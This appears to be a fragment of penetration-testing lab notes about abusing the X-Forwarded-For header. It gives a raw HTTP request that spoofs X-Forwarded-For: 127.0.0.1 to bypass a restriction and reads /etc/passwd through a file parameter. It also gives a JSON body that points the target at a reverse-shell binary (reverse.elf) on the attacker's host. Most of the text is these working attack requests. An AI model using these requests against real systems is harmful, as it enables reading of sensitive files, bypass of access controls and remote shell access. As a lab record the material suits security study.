### 

X-Forwarded-For Header

"The X-Forwarded-For (XFF) header is a de-facto standard header for identifying the originating IP address of a client connecting to a web server through an HTTP proxy or a load balancer. When traffic is intercepted between clients and servers, server access logs contain the IP address of the proxy or load balancer only. To see the original IP address of the client, the X-Forwarded-For request header is used."

```powershell
GET /logs?file=/etc/passwd HTTP/1.1

Host: 192.168.209.134:13337

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Connection: keep-alive

Upgrade-Insecure-Requests: 1

Priority: u=0, i

X-Forwarded-For: 127.0.0.1

Content-Length: 6
```

Appended X-Forwarded-For: 127.0.0.1 to bypass

Included /logs?file=/etc/passwd in GET req

```powershell
{
"user":"clumsyadmin",
"url":"http://192.168.45.196:22/reverse.elf"
} 
```

Change Req to POST